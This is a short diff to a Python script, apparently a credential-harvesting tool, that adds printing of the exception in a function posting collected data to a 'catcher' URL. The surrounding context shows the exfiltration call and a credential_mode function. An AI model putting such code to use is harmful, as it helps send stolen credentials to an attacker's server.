@@ -50,8 +50,9 @@ def send_data_to_catcher(data, use_ssl):
     try:
         response = requests.post(catcher_URL, json=data, timeout=3, verify=use_ssl)
         print("[+] Data sent to the catcher.")
-    except requests.RequestException:
+    except requests.RequestException as e:
         print(f"[-] Failed to send data to the catcher.")
+        print(e)
    
 
 def credential_mode(credentials):
